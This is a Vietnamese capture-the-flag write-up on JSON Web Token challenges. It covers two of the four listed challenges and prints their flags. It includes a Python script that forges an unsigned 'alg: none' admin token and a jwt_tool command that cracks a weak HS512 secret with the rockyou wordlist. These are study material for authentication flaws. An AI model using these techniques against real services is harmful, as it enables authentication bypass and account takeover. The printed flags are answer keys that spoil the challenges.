# Trần Mạnh Huy - JWT - json web token
<hr>
# Table of content 

* [Chall 1: JSON Web Token (JWT) - Introduction](#chall-1-json-web-token-jwt---introduction)
* [Chall 2: JSON Web Token (JWT) - Weak secret](#chall-2-json-web-token-jwt---weak-secret)
* [Chall 3: JWT - Revoked token](#chall-3-jwt---revoked-token)
* [Chall 4: JSON Web Token (JWT) - Public key](#chall-4-json-web-token-jwt---public-key) 

<hr>

## Chall 1: JSON Web Token (JWT) - Introduction
```
To validate the challenge, connect as admin.
```
Ta có login form như sau 

![image](https://user-images.githubusercontent.com/104350480/219703907-2e0197cf-93da-4230-a230-164f0473c52c.png)

Để ý có nhấn vào guest thử rồi check burp:

![image](https://user-images.githubusercontent.com/104350480/219705924-bb74b020-b6d7-48b5-a735-c662ef36634e.png)

Sửa thử username = admin thì server trả về lỗi: 

![image](https://user-images.githubusercontent.com/104350480/219708136-04c02ff0-8a0f-4ce9-891f-fee65f60067a.png)



Thế thì ta chỉnh alg = none vì để none thì server sẽ kh xác thực signature nữa, ta xóa phần signature cũng được và lỗi cũng biến mất, ta được kết quả.

![image](https://user-images.githubusercontent.com/104350480/219706460-833ef24c-d343-48b9-9eff-aa7d2a16d3ae.png)

> flag: S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7

```
import base64
import json

header = {'typ':'JWT', 'alg':'none'}
payload = {'username':'admin'}
header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode('utf-8').rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode('utf-8').rstrip('=')
data = header_encoded +'.'+payload_encoded+'.'
print(data)
```

## Chall 2: JSON Web Token (JWT) - Weak secret

```
"Let's play a small game, I bet you cannot access to my super secret admin section. Make a GET request to /token and use the token you'll get to try to access /admin with a POST request."

```

![image](https://user-images.githubusercontent.com/104350480/219711939-05cb4769-bdef-4024-aea3-2e92e5ffb132.png)

Mở đường dẫn /token ta có token:

> Here is your token	"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"

![image](https://user-images.githubusercontent.com/104350480/219831488-82906321-0618-429f-a177-6ed253af0c4f.png)


Chuyển sang phương thức POST /admin, ta có: 

![image](https://user-images.githubusercontent.com/104350480/219831018-a2a1142c-255f-42ca-a9b4-9a897db12daf.png)

Thêm Authorization vào xem được gì nào: 

![image](https://user-images.githubusercontent.com/104350480/219831273-213e8862-495d-4558-b382-0bd9f36e0e7a.png)

Bài này dùng alg: HS512, thì như tên bài thì có vẻ secret key khá yếu, dùng tool để bruteforce xem sao: Ở đây ta dùng jwt_tool với list đơn giản
từ rockyou.txt

> payload: python3 jwt_tool.py --token --C -d /usr/share/wordlists/rockyou.txt 

![image](https://user-images.githubusercontent.com/104350480/219830868-0655a46b-6375-4fa5-bab8-da0cac9e3afd.png)

Oke vậy là ta có được secretkey là lol, giờ ném lên jwt.io chỉnh lại payload thành admin và thêm secretkey lol là xong: 

![image](https://user-images.githubusercontent.com/104350480/219832730-a58fad6e-e2cb-48c3-a422-c3b4d957b817.png)

> Flag: PleaseUseAStrongSecretNextTime
